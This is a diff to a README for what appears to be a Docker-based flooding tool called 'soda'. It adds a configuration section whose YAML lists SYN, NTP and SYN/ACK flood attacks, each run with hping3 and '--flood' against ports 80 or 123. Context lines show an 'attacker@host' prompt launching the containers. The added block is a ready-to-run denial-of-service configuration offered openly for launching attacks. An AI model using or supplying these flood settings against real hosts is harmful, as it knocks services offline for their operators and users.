@@ -15,3 +15,28 @@ attacker@host$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock 
 ^CKilling all running containers...
 goofy_keldysh
 ```
+# Configuration
+soda.yml config file allows to specify what kind of attacks you want to launch. This file contains yaml declaration for tool name and it's paramaeters.
+```
+attacks:
+  - type: "SYN Flood"
+    tool: "hping3"
+    flags:
+      - "-S"
+      - "-p 80"
+      - "--flood"
+  - type: "NTP Flood"
+    tool: "hping3"
+    flags:
+      - "-2"
+      - "-p 123"
+      - "-s 123 -k"
+      - "-d 64"
+      - "--flood"
+  - type: "SYN/ACK Flood"
+    tool: "hping3"
+    flags:
+      - "-SA"
+      - "-p 80"
+      - "--flood"
+```
